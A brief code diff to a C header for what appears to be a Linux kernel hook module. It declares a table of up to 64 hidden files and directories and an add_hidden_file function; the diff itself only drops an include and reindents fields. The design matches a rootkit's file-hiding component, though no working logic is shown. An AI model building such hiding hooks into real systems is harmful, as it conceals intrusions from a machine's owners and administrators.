@@ -6,14 +6,13 @@
 #define _HOOK_H
 
 #include <linux/types.h>
-#include <linux/miscdevice.h>
 
 #define MAX_HIDDEN_FILES 64
 
 struct hidden_entry {
-    char name[256];
-    bool is_dir;
-    bool active;
+	char name[256];
+	bool is_dir;
+	bool active;
 };
 
 int add_hidden_file(const char *name, bool is_dir);
